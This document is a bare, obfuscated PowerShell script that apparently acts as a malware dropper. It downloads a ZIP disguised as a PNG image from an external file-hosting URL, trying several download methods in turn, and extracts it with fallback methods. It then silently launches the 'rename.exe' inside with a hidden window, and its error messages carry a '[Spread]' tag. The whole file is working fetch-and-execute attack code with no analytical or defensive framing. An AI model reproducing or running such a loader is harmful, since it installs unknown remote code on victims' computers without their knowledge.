$maZ1G = "https://file.freestorage-04.bond/files/2026/10/5/cd2f3fb9-6c80-4243-9429-d54e87a931f6/haha.png?srl=II-DSBd1GW9Cp8UHWbh2NQ&exp=1791247315"
$dyvDqw = [System.IO.Path]::GetRandomFileName().Replace('.','')
$hAc33a = [System.IO.Path]::GetTempPath()
$Z209wy = Join-Path $hAc33a ("$dyvDqw" + ".zip")
$zd3GLO = Join-Path $hAc33a $dyvDqw
$lyCaK = "rename.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch { }

function _spreadStop {
    param([string]$oEyvM)
    Write-Host ('[Spread] ' + $oEyvM) -ForegroundColor Red
    try {
        if ($Host.Name -eq 'ConsoleHost' -and [Environment]::UserInteractive) {
            Read-Host 'Press Enter to exit'
        } else {
            Start-Sleep -Seconds 8
        }
    } catch {
        Start-Sleep -Seconds 8
    }
    exit 1
}

if (Test-Path -LiteralPath $zd3GLO) {
    Remove-Item -LiteralPath $zd3GLO -Recurse -Force -ErrorAction SilentlyContinue
}

$DEjBSo = $false
try {
    Start-BitsTransfer -Source $maZ1G -Destination $Z209wy -ErrorAction Stop
    $DEjBSo = $true
} catch { }
if (-not $DEjBSo) {
    try {
        (New-Object Net.WebClient).DownloadFile($maZ1G, $Z209wy)
        $DEjBSo = $true
    } catch { }
}
if (-not $DEjBSo) {
    try {
        Invoke-WebRequest -Uri $maZ1G -OutFile $Z209wy -UseBasicParsing
        $DEjBSo = $true
    } catch {
        _spreadStop 'All download methods failed (BITS / WebClient / Invoke-WebRequest).'
    }
}

if (-not (Test-Path -LiteralPath $Z209wy)) {
    _spreadStop 'ZIP was not saved to temp — check URL, firewall, TLS.'
}
$aYFvz = [IO.File]::ReadAllBytes($Z209wy)
if ($aYFvz.Length -ge 3 -and $aYFvz[0] -eq 0xEF -and $aYFvz[1] -eq 0xBB -and $aYFvz[2] -eq 0xBF) {
    $HkBBHknn = New-Object byte[] ($aYFvz.Length - 3)
    [Array]::Copy($aYFvz, 3, $HkBBHknn, 0, $HkBBHknn.Length)
    [IO.File]::WriteAllBytes($Z209wy, $HkBBHknn)
    $aYFvz = $HkBBHknn
}
if ($aYFvz.Length -lt 4 -or $aYFvz[0] -ne 0x50 -or $aYFvz[1] -ne 0x4B) {
    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0} {1}' -f $aYFvz[0], $aYFvz[1])
}

$vCmFeF = $false
try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    [System.IO.Compression.ZipFile]::ExtractToDirectory($Z209wy, $zd3GLO)
    $vCmFeF = $true
} catch { }
if (-not $vCmFeF) {
    try {
        if (Test-Path -LiteralPath $zd3GLO) {
            Remove-Item -LiteralPath $zd3GLO -Recurse -Force -ErrorAction SilentlyContinue
        }
        Expand-Archive -LiteralPath $Z209wy -DestinationPath $zd3GLO -Force
        $vCmFeF = $true
    } catch { }
}
if (-not $vCmFeF) {
    try {
        if (Test-Path -LiteralPath $zd3GLO) {
            Remove-Item -LiteralPath $zd3GLO -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType Directory -Path $zd3GLO -Force | Out-Null
        $po3AyJs = New-Object -ComObject Shell.Application
        $V07wEkXj = $po3AyJs.NameSpace((Resolve-Path $Z209wy).Path)
        $Y5dd = $po3AyJs.NameSpace((Resolve-Path $zd3GLO).Path)
        $Y5dd.CopyHere($V07wEkXj.Items(), 0x14)
        $dRSF = 120
        $y2qp = 0
        while ($y2qp -lt $dRSF -and -not (Test-Path -LiteralPath (Join-Path $zd3GLO $lyCaK))) {
            Start-Sleep -Milliseconds 500
            $y2qp++
        }
        if (Test-Path -LiteralPath (Join-Path $zd3GLO $lyCaK)) { $vCmFeF = $true }
    } catch { }
}
if (-not $vCmFeF) {
    _spreadStop 'Could not unzip (ZipFile / Expand-Archive / Shell all failed).'
}

$y86oF2 = Join-Path $zd3GLO $lyCaK
if (-not (Test-Path -LiteralPath $y86oF2)) {
    _spreadStop ('EXE not found: ' + $y86oF2)
}

$JQmRu6M = (Get-Location).Path
Set-Location -LiteralPath $zd3GLO
try {
    $PHYC = Start-Process -FilePath $y86oF2 -WindowStyle Hidden -PassThru
} catch {
    _spreadStop ('Could not start rename.exe: ' + $_.Exception.Message)
} finally {
    if ($JQmRu6M) { Set-Location -LiteralPath $JQmRu6M }
}
